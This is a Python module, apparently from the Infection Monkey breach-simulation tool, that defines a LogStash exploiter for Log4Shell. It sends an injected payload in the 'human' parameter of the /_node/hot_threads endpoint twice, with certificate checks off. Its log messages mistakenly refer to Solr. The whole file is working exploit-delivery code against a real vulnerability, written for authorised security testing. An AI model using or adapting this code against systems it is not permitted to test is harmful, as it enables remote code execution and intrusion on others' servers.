import time
from logging import getLogger

import requests

from infection_monkey.exploit.log4shell_utils.service_exploiters import IServiceExploiter
from infection_monkey.model import VictimHost

logger = getLogger(__name__)


class LogStashExploit(IServiceExploiter):
    service_name = "LogStash"

    @staticmethod
    def trigger_exploit(payload: str, host: VictimHost, port: int):
        url = f"http://{host.ip_addr}:{port}/_node/hot_threads?human={payload}"
        try:
            logger.debug(f"Sending solr exploitation request")
            resp = requests.post(url, timeout=5, verify=False)  # noqa DUO123
            logger.debug(f"Solr exploitation got a response with status {resp.status_code}")
            logger.debug(f"Response contents: {resp.content}")
            time.sleep(5)
            logger.debug(f"Sending another solr exploitation request")
            resp = requests.post(url, timeout=5, verify=False)
            logger.debug(f"Solr exploitation got a response with status {resp.status_code}")
            logger.debug(f"Response contents: {resp.content}")

        except requests.ReadTimeout as e:
            logger.debug(f"Log4shell request failed {e}")
